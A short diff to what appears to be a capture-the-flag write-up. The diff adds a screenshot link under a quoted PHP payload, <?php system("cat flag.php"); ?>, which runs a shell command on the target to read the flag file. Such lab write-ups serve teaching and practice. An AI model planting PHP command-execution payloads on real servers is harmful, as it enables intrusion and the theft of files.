@@ -92,3 +92,6 @@ We can then find the name of the flag file and read its contents.
 ```php
 <?php system("cat flag.php"); ?>
 ```
+
+![image](https://user-images.githubusercontent.com/56489087/139528082-7b83b53e-8123-4fec-97a7-6c659a64d35a.png)
+
